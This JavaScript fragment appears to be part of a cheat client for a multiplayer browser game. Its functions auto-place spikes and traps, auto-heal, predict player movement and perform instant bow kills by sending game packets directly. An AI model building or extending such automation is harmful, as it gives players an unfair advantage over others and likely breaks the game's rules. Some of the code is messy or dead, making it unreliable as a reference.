                    spike[s].spikeTrap = true;
                    spike[s].canPush = true;
                }
            }
            if(enemy.inTrap && !spike[s].sids.includes(enemy.inTrap.sid) && trapDist <= 50 + spike[s].scale + 21) { // possible autopush spike
                spike[s].canPush = true;
                spike[s].points += 1;
            }
            if(enemy.inTrap && dist4 <= 250 && (dAng(spike[s].angle, enemy.inTrap.angToMe) >= 1.5 || moveDirection === null || moveDirection === undefined)) { // spike surrounds trapped player
                spike[s].points += 2;
            }
            if(angleAbuse && dist4 <= enemy.placePot.placeRange) { // angle abuse
                spike[s].points += 1;
            }
            if(!kln || kln.points <= spike[s].points) kln = spike[s];
        }
       lapw = {};
    }
    return {
        spikes: spike,
        traps: trap,
        kln: kln,
        rNn: rNn
    }
}
function gradeCombinations(buildings){ // maybe add later
    buildings = buildings.filter(x => x.points >=1).sort((a, b) => b.points - a.points);
    const result = [];

    function gradeCurrent(combination) {
        /*    for(let i = 0; i < combination.length; i++){

}*/
        return combination.reduce((sum, { points }) => sum + points, 0);
    }

    function generateCombinations(current, remaining, start) {

        if (current.length > 0 && current.length <= 4) {
            const combinationObject = {
                points: gradeCurrent(current),
                buildings: [...current],
            };
            result.push(combinationObject);
            if(result.length >= 3000) return result;
        }

        for (let i = start; i < remaining.length; i++) {
            if(!current.some(item => dist2(item, remaining[i]) <= item.scale + remaining[i].scale)) {
                current.push(remaining[i]);
                generateCombinations(current, remaining.slice(i + 1), i + 1);
                current.pop();
            }
        }
    }
    generateCombinations([], buildings, 0);
    return result;
}

function checkPlacement(obj, priority, ppAmt, timer, canPlace){
    //console.log(obj, priority, ppAmt, timer, canPlace);
    if(obj.preplace && obj.placePriority && ppAmt < 2 && packets <= 60){
        setTimeout(() => {
            place(obj.item.id,obj.angle);
            prioLoc.push(obj);
        }, placeDelay - pingavg)
        ue.add(tick, obj.x, obj.y, obj.angle, obj.scale, null, R.list[obj.item.id], !0, {sid: E.sid}, 0, 0, 1, 1, 1,0) // comment for tests
        return true;
    } else if(obj.placePriority && ppAmt < 3 && packets <= 60){
        placers(obj.item.id,obj.angle)
        prioLoc.push(obj);
        ue.add(tick, obj.x, obj.y, obj.angle, obj.scale, null, R.list[obj.item.id], !0, {sid: E.sid}, 0, 0, 1, 1, 0, 0)
        return true;
    }
    canPlace = ue.checkItemLocation(obj.x, obj.y, obj.scale, .6, obj.item.id, false, priority)
    if(canPlace){
        placers(obj.item.id,obj.angle)
        ue.add(tick, obj.x, obj.y, obj.angle, obj.scale, null, R.list[obj.item.id], !0, {sid: E.sid}, 0, 0, 1, 1, 0, 1)
        return true;
    }
    return false;
}
function placers(id, ang){
    knla.send("z", id, null);
    knla.send("F", 1, ang);
    knla.send("z", hold ? hold : E.weaponIndex, true);
}
function autoplacers(trap, spike) {
    if(!document.getElementById("autoplacerrrr").checked && !nearestenemy||!amAlive||R.list[E.items[4]]?.name != "pit trap"||!E.items[4]||clairo2) return;
    let timer = Date.now();
    let preplaceAmt = 0;
    let possibleSpikes = findAvailableAngles(spikeType, 0, 0, PI / 35)
    let possibleTraps = findAvailableAngles(boostType, 0, 0, PI / 35)
    let placer = gradeAngles(possibleSpikes, possibleTraps, nearEnemies, timer)
    usedAngles = usedAngles.filter(x => tick-x.tick <= 6 && dist(E,x) <= x.offset + 20);
    trap = placer.rNn;
    spike = placer.kln;
    placer.spikes.sort((a, b) => b.points - a.points);
    placer.traps.sort((a, b) => b.points - a.points);
    // sort spikes and traps by highest points
    if(!placer.spikes.length && !placer.traps.length) return;
    function fullplace(e, all = placer.spikes.concat(placer.traps)){
        //  all = all.sort((a, b) => b.points - a.points);
        all.filter(x => x.points > 0);
        if(packets >= 85) return;
        if(!spike&&!trap&&!keys.c) return;
        all = all.sort((a, b) => {
            if (b.points === a.points && a.name !== b.name) {
                // If points are the same and names are different, prioritize pit trap
                return a.name === 'pit trap' ? -1 : 1;
            }
            return b.points - a.points;
        });
        for(let i = 0; i < all.length; i++) { // check for any intersections lol

            if(!e.some(item => dist2(item, all[i]) <= item.scale + all[i].scale)){
                e.push(all[i])
            };
            if(e.length === 4) break;
        }
        for(let i = 0; i < e.length; i++) {
            if(!e[i].did) { // !.did only for the kln and rNn placements
                if(e[i].preplace && e[i].placePriority && packets <= 60) preplaceAmt++;
                checkPlacement(e[i], packets <= 60 ? e[i].placePriority : 0, preplaceAmt, timer)
                usedAngles.push({...e[i], tick: tick});
            }
        }
      
    }
    let placing = [];
    if(spike && spike.points>0 && (!trap?.canPush || (!trap?.retrap || !spike.into))) {
        if(spike.into) {
            KB(spike.into.newPos)
        }
        if(spike.placePriority) {
            if(spike.preplace){
                preplaceAmt++
                setTimeout(() => {
                    place(spikeType, spike.angle)
                    usedAngles.push({...spike, tick: tick});
                    prioLoc.push(spike);
                }, placeDelay - pingavg);
            } else {
                placers(spikeType, spike.angle)
                usedAngles.push({...spike, tick: tick});
                prioLoc.push(spike);
            };
            spike.did = true;
            placing.push(spike);
            ue.add(tick, spike.x, spike.y, spike.angle, spike.scale, null, R.list[spikeType], !0, {sid: E.sid}, false, true, true, spike.preplace)
        } else {
            checkPlacement(spike, 0)
            usedAngles.push({...spike, tick: tick});
            spike.did = true;
            placing.push(spike);
        }
    }
    if(trap && trap.points > 0 && !(spike && spike.points>0 && dist(trap,spike) <= trap.scale+spike.scale && !isInPath(spike))|| (trap?.canPush || trap?.retrap && !spike.into)) {
        if(trap.placePriority) {
            if(trap.preplace) {
                preplaceAmt++
                setTimeout(() => {
                    place(boostType, trap.angle)
                    usedAngles.push({...trap, tick: tick});
                    prioLoc.push(trap);
                }, placeDelay - pingavg);
            } else {
                placers(boostType, trap.angle)
                usedAngles.push({...trap, tick: tick});
                prioLoc.push(trap);
            };
            trap.did = true;
            placing.push(trap);
            ue.add(tick, trap.x, trap.y, trap.angle, trap.scale, null, R.list[boostType], !0, {sid: E.sid}, false, true, true, trap.preplace);
        } else {
            checkPlacement(trap, 0)
            usedAngles.push({...trap, tick: tick});
            trap.did = true;
            placing.push(trap);
        }
    }
    fullplace(placing);
    if(placeDurations.length>=6) placeDurations.pop()
    placeDurations.unshift(Date.now()-time)
}
let logStack = [];
const stackTimeout = 5000;
function logAndStack(message) {
    const existingLog = logStack.find(item => item.message === message);
    if (existingLog) {
        existingLog.count++;
    } else {
        logStack.push({ message: message, count: 1 });
    }
    logStack.forEach(log => {
    });
    setTimeout(() => {
        logStack = logStack.filter(log => log.count > 1);
    }, stackTimeout);
}
async function stealAnimal(e,dir){
    if(wr_obj||!amAlive) return;
    e = ye.filter((t)=> t.health<R.weapons[primary].dmg*(bH.includes(7)?1.5:1)*Variants[E.primaryVar]&&t.visible)
    e = e.sort((a,b) => b.killScore - a.killScore)[0]

    if(e &&dist(E,e)-1.8*e.scale<=R.weapons[primary].range&&E.pr == 1){
        console.log(e)
        wr_obj = true;
        knla.send("K",1)
        aim[0] = getAimer(E,e)
        knla.send("z", primary, true);
        Hg(7,18)
        knla.send("D",getAimer(E,e), "client")
        await nextTick()
        wr_obj = false;
    }
}
function shieldBypass(e,t,dir){
    if(t.weaponIndex!=11) return true;
    dir = getAimer(e,t)
    return C.getAngleDist(dir + PI, t.dir) > PI / 3
}
async function bowInsta(){
    paths = [];
    if(!(distance>=670&&distance<=700)){
        knla.send("9",getAimer(E,coords), "client");
    } else{
        knla.send("9",null, "client")
    }
    if(E.age < 9) 
    if((distance>=670&&distance<=700)&& E.movSpd <= 5 && nearestenemy.movSpd <= 5&&utilityType!=undefined&&E.age>=9){
        console.log(distance, "bow insta distance")
        if(R.list[utilityType].name == "platform")place(utilityType,getAimer(E,nearestenemy));
        await nextTick();
        Hg(53, 0);
        hold = secondary
        wr_obj =true;
        bowinstaing = false;
        knla.send("z",secondary,true)
        aim[0] = getAimer(E,nearestenemy)
        knla.send("D",getAimer(E,nearestenemy), "client")
        console.log(distance)
        await nextTick()
        Hg(38,0)
        hold = secondary
        aim[0] = getAimer(E,nearestenemy)

       
        knla.send("H",12)
        await nextTick()
        hold = secondary
        aim[0] = getAimer(E,nearestenemy)
        knla.send("H",15)
      
        await nextTick()
        //  Hg(38, 0);
        hold = null
        wr_obj =false;
        bowinstaing = false;
        visAim = false
    };
}




function JETXRAH(_,ticks,ang,set,posArr = [],type,player,v){
    //   console.log(ticks, 'did calc');
    player = {..._}
    if(_.sid==E.sid && ang!==0 &&!ang){ ang = moveDirection} else if(inTrap&&_.sid==E.sid){ ang = undefined} else if(!ang&&ang!==0){ang = _.movDir}
    v = bTw(player,ang)
    player.xVel = v.xVel
    player.yVel = v.yVel
    player.x2 = v.real.x
    player.y2 = v.real.y
    posArr.push(v)
    if(ticks-1<=0) {
        return posArr;
    } else {
        return JETXRAH(player,ticks-1,ang,player,posArr);
    }
}


function bTw(_,ang,set,docalc,time = 111){
    //  if(!time) time =111;
    //if(!isNaN(ang)){
    if(!docalc){
        if(_.sid==E.sid && ang!==0 &&!ang){ ang = moveDirection} else if(inTrap&&_.sid==E.sid){ ang = undefined} else if(!ang&&ang!==0){ang = _.movDir}
    }
    //  }
    let cosX = cos(ang)//_.sid == R.sid ?Math.cos(ang!=undefined&&ang!==undefined?ang:!inTrap?moveDirection:undefined) :Math.cos(_.movDir);
    let sinY = sin(ang)//_.sid == R.sid?Math.sin(ang!=undefined&&ang!==undefined?ang:!inTrap?moveDirection:undefined) :Math.sin(_.movDir);
    let sqrtDis = sqrt(cosX * cosX + sinY * sinY);
    sqrtDis!=0 && (cosX /= sqrtDis,sinY /= sqrtDis)
    if(!set) set = _;
    let mult = speed7(set);
    _.speedXD = 0;
    _.speedYD = 0;
    _.predY = 0;
    _.predX = 0;
    cosX && (_.speedXD += cosX * .0016 * mult * time)
    sinY && (_.speedYD += sinY * .0016 * mult * time)
    var y0 = C.getDistance(0, 0, _.speedXD * time, _.speedYD * time), k0 = min(4, max(1, round(y0 / 40))), v0 = 1 / k0
    //  U = Math.min(4, Math.max(1, Math.round(O / 40)))
    // console.log(v0)
    // console.log(_.speedXD,_.speedYD)
    _.speedXD && (_.predX += _.speedXD * time)
    _.speedYD && (_.predY += _.speedYD * time)
    //  console.log(v0)
    let velXD = _.xVel*pow(.993,time),
        velYD = _.yVel*pow(.993,time),
        velX = velXD+_.predX,
        velY = velYD+_.predY,
        accel = {x:_.x2+velX,y:_.y2+velY,type:'accel'},
        decel = {x:_.x2+velXD,y:_.y2+velYD,type:'decel'},
        fullDecel = fulldecel(velX,velY,{x:_.x2+velX,y:_.y2+velY}),
        current = {x:_.x2,y:_.y2,type:"current"},
        nextVel = {x:velX,y:velY,type:'nextVel'},
        real = accel,
        vel = round(sqrt(velX * velX + velY * velY)),
        spd = mult,
        //  realxVel = Math.abs(Math.round(Math.sqrt(velX * velX))),
        // realyVel = Math.abs(Math.round(Math.sqrt(velY * velY)))
        boostxVel, boostyVel;
    //console.log(velX,velY)
    //  console.log(E.xVel,E.yVel,velX,velY)
    boostxVel = time * 1.5 * cos(ang);
    boostyVel = time * 1.5 * sin(ang);
    let boostCoords = { x: _.x2 + boostxVel, y: _.y2 + boostyVel };
    if(ltt[_.sid]?.np!=undefined&&_.sid!=E.sid)real = dist(_,ltt[_.sid]?.np?.accel)>dist(_,ltt[_.sid]?.np?.decel)&&dAng(_.movDir,_.pmovDir)<=.3 ?decel:accel;
    if(_.sid==E.sid){
        if(moveDirection == undefined||moveDirection == null){
            real = decel;
        } else{
            real = accel;
        }
    }
    function fulldecel(e,t,coords,e2,t2){
        if(isNaN(e)||isNaN(t))return;
        try{
            e2 = e*decayRate;
            t2 = t*decayRate;
            if(e!=e2){ e = e2
                      coords.x+=e
                     }
            if(t!=t2){ t = t2
                      coords.y+=t

                     }
            if(e==e2&& t==t2){
                return {x:coords.x,y:coords.y,type:'full decel'}
            } else{
                //  console.log(e,t,coords)
                return fulldecel(e,t,coords)
            }
        } catch(e){}
    }
    let result = {accel:accel,decel:decel,boostCoords:boostCoords,boostVel:{x:boostxVel,y:boostyVel},nextVel:nextVel,real:real,current:current,fullDecel:fullDecel,xVel:velX, spd: mult, yVel:velY,vel:vel}
    return result
}
function place(id,ang,wep) {//||!R.canBuild(R.list[id])&&id!=foodType
    if(id==null||id==undefined||id==foodType&&E.food<R.list[foodType].req[1]&&!sandbox||!E.canBuild(R.list[id])&&id!=foodType||!amAlive||id==foodType && E.skinIndex==45) return;
    !wep&&hold? wep = hold:wep = E.weaponIndex
    knla.send("z",id,null)
    knla.send("F",1,ang)
   

    knla.send("z",wep,(wep==wep||wep==secondary)?true:null)
    //id != foodType && addVisual(id, ang); // op XD // remove this for no visual (fix later)
}
function healPlacer(id,ang,wep) {//||!R.canBuild(R.list[id])&&id!=foodType
    if(id==null||id==undefined||id==foodType&&E.food<R.list[foodType].req[1]&&!sandbox||!E.canBuild(R.list[id])&&id!=foodType||!amAlive||id==foodType && E.skinIndex==45) return;
    !wep && hold ? wep = hold : wep = E.weaponIndex;
   knla.send("z", id);
    knla.send("F", 1);
    knla.send("z",wep,(wep==wep||wep==secondary)?true:null);
    //id != foodType && addVisual(id, ang); // op XD // remove this for no visual (fix later)
}
function heal(e=E.health, t = [20, 40, 30]){
    for(var n = e; n < 100; n += t[E.items[0]]) healPlacer(E.items[0], true);
}
function addVisual(millType, t) {
    let n = R.list[millType];
    let i = (35 + n.scale + (n.placeOffset || 0));
    let x = E.x2 + cos(t) * i
    let y = E.y2 + sin(t) * i
    console.log("PLS");
    ue.add(tick, x, y, C.fixTo(atan2(y - E.y2, x - E.x2) || 0, 2), n.scale, null, R.list[n.id], !0,{sid: E.sid},false, false, true,true)
}
function place2(id, wep) {//||!R.canBuild(R.list[id])&&id!=foodType
    if(id==null||id==undefined||id==foodType&&E.food<R.list[foodType].req[1]&&!sandbox||!E.canBuild(R.list[id])&&id!=foodType||!amAlive||id==foodType && E.skinIndex==45) return;
    !wep&&hold? wep = hold:wep = E.weaponIndex
    knla.send("z",id)
    knla.send("F",1)
    knla.send("z",wep,(wep==wep||wep==secondary)?true:null)
}
function Qheal(e = 100-E?.dmgpot?.hp, t = [20, 40, 30]){
    for(var n = e; n < 100; n += t[E.items[0]])place2(E.items[0], true)
}








function getOrdinalNumber(number) {
    const suffixes = ["th", "st", "nd", "rd"];
    const lastDigit = number % 10;
    const suffix = suffixes[number % 100 > 10 && number % 100 < 20 ? 0 : (lastDigit < 1 || lastDigit > 3) ? 0 : lastDigit];
    return number + suffix;
}









function Checknood(_){
    let test = 0;
    let ez = _.loadout;
    if(ez?.spawnpad ||R.weapons[_?.secondary]?.age==9||ez?.spike?.age==9) return 9;
    ez.utility &&(test = 7);

    test<R.weapons[_?.secondary]?.age&&(test = R.weapons[_?.secondary]?.age);

    test<R.weapons[_?.primary]?.age &&(test = R.weapons[_?.primary]?.age);

    test<ez?.spike?.age &&(test = ez.spike.age);

    test<ez?.food?.age &&(test = ez.food.age);

    test<ez?.windmill?.age && (test = ez.windmill.age);
    test<ez?.wall?.age && (test = ez.wall.age);

    _?.weaponIndex == 0 &&(test = 1);

    // console.log(R.list)
    if(_?.primary==0&&test>1) _.primary = undefined;
    return test;
}
const defaultSpeed = timeBetweenTick / 2;
function speed7(_){
    var i = (((_.buildIndex < 0) + 1) / 2) * (R.weapons[_.weaponIndex]?.spdMult || 1) * (_.skinIndex && Xt.find(s => s.id == _.skinIndex)?.spdMult || 1)
    * (_.tailIndex && Gt.find(r => r.id == _.tailIndex)?.spdMult || 1)
    * (_.y2 <= T.snowBiomeTop ? _.skinIndex && Xt.find(p => p.id == _.skinIndex)?.coldM ? 1 : .75 : 1) * 1/*_.slowMult*/;
    !_.zIndex && _.y2 >= T.mapScale / 2 - T.riverWidth / 2 && _.y2 <= T.mapScale / 2 + T.riverWidth / 2 &&
        (_.skinIndex && Xt.find(s => s.id == _.skinIndex).watrImm ? (i *= 0.75) : (i *= 0.33));
    return i;
}
function findID(tmpObj, tmp) {
    return tmpObj.find((THIS) => THIS.id == tmp);
}
function speedTest(_, backup) {
    _ = {
        buildIndex: _?.buildIndex ?? backup?.buildIndex ?? -1,
        weaponIndex: _?.weaponIndex ?? backup?.weaponIndex ?? null,
        skinIndex: _?.skinIndex ?? backup?.skinIndex ?? null,
        tailIndex: _?.tailIndex ?? backup?.tailIndex ?? null,
        y2: _?.y2 ?? backup?.y2 ?? 0,
        zIndex: _?.zIndex ?? backup?.zIndex ?? false
    };
    //console.log(_);
    let i = (((_.buildIndex < 0) + 1) / 2) *
        (R.weapons[_.weaponIndex]?.spdMult || 1) *
        (_.skinIndex && Xt.find(s => s.id == _.skinIndex)?.spdMult || 1) *
        (_.tailIndex && Gt.find(r => r.id == _.tailIndex)?.spdMult || 1) *
        (_.y2 <= T.snowBiomeTop ? (_.skinIndex && Xt.find(p => p.id == _.skinIndex)?.coldM ? 1 : 0.75) : 1) *
        1; // Adjust as needed, _.slowMult is commented out

    if (!_.zIndex && _.y2 >= T.mapScale / 2 - T.riverWidth / 2 && _.y2 <= T.mapScale / 2 + T.riverWidth / 2) {
        const watrImmMult = (_.skinIndex && Xt.find(s => s.id == _.skinIndex)?.watrImm) ? 0.75 : 0.33;
        i *= watrImmMult;
    }

    // Add defaultSpeed calculation if needed

    return defaultSpeed * i;
}
function onioncheckestoo(e,t){
    let ez=0;
    let obj = R.list[t]
    if(obj.group.name == 'mill'){
        e.windmill = obj
    }
    if(obj.group.name == 'spikes'){
        e.spike = obj
    }
    if(obj.name == "boost pad"){
        e.trap = false;
        //     console.log(e+" has", R.list[t].name)
    }
    if(obj.age == 7){
        e.utility = obj;
        //    console.log(e+" has", R.list[t].name)
    }
    if(obj.group.name == 'walls'){
        e.wall = obj
        // console.log(e+" has", R.list[t].name)
    }
    if(obj.group.name == 'food'){
        e.food = obj
        //  console.log(e+" has", R.list[t].name)
    }
    if(obj.name == "spawn pad"){
        e.spawnpad = true;
    }
}



function findTurret(e,t){
    let turretFind = et.find((b)=>b.name=='turret'&&b.x==e&&b.y==t)
    if(turretFind){
        turretFind.time =2200;
        turretFind.NOW=false;
        turretFind.shot = Date.now();
        return turretFind
    }
    return false
}
function turretTimer(){
    for(let i=0;i<et.length;i++){
        let turreter = et[i]
        if(turreter.name == 'turret' && turreter?.time) turreter.time -= E.delta;
        if(turreter.name == 'turret'&& turreter?.time<=0 )turreter.time = 2200;
    }
}



function nextTick(){
    return new Promise(r => {
        managePromises[managePromises.length] = r
    });
}



function elem(){
    if(document.activeElement.id ==="") return true
    return false
}
function dist2(a,b){
    return C.getDistance(a.x2 || a.x, a.y2 || a.y, b.x2 || b.x, b.y2 || b.y)//Math.sqrt(Math.pow((b.y2||b.y) - (a.y2||a.y), 2) + Math.pow((b.x2||b.x) - (a.x2||a.x), 2));
}
function dist(a, b, bool) {
    const distance = bool === "player" ? -1.8 * 35 : bool === "object" ? -b?.scale : 0;
    return C.getDistance(a.x2 || a.x, a.y2 || a.y, b.x2 || b.x, b.y2 || b.y) + distance
}
